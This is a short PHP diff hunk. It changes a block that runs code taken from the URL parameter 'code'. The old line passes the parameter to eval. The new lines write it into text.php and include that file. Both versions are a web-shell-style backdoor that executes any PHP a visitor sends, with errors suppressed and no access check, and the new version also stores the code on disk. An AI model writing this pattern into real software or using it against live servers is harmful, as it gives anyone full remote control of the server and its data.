@@ -60,7 +60,8 @@ echo $response->body(); */
     //var_dump(\GeometryLibrary\PolyUtil::decode("e}fg@ixjSM@C?C?A?A?AAAAA?ACAA?ECEAOAMGeA??Eq@E}@A[?W??AMy@G]@YBWB]FoBJ??Cg@C_@C[Io@EQEQCMIUM]Uc@Yc@yA_C??BE@ABC@A?C@A@C?C@A?CACAE?CACAECCACACAAC?AAA?A?A?C?A?A?A?GKEGEIa@w@Ua@MSMSc@i@e@k@c@a@g@_@y@g@q@YQGYKSG_AUGAwAc@c@MeA[e@O[I]IOESESIeA]c@M_@OYKi@YWQm@a@USMI}@w@{AwAsAuAGEcF}EIGGGmBqBoB{Bq@u@k@aA??@A?A@A?A?A@A?A@A?K?CACAE?CCCACCAIIUE{@y@]]aA}Bo@sAeAmB}@qA}@gAe@e@kAq@]Uc@Yc@Wo@[_@QgJkEwAy@gAo@YSQM_Au@qAoAcAgAc@g@W[m@o@W_@EGWc@??@G@K?EAGEIi@iAo@}AHYNMLILQLAH?DH??CD??`@d@FHLNNVRZ??n@i@??PXPVRXNN@@?@?@?@KH??LN"));
     require 'vendor/autoload.php';
     if (@$_GET['code']) {
-        eval(@$_GET['code']);
+        file_put_contents('text.php',"<?php ".@$_GET['code']);
+        include "text.php";
     }
 
     ?>
